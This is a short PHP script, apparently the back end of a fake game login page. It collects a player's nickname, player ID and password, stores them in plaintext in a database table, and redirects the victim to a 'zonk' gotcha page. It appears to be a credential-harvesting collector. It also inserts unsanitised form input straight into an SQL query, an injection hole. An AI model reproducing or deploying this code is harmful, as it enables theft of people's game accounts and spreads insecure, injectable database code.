<?php
include("db.php");

$nickname = $_POST['nickname'];
$playerid = $_POST['playerid'];
$password = $_POST['password'];

if (empty($nickname) || empty($playerid) || empty($password)) {
    echo "<script>alert('Semua field wajib diisi!'); window.location='index.php';</script>";
    exit;
}

$sql = "INSERT INTO users_dummy (nickname, player_id, password_dummy) VALUES ('$nickname','$playerid','$password')";
mysqli_query($conn, $sql);

header("Location: zonk.php");
exit;
?>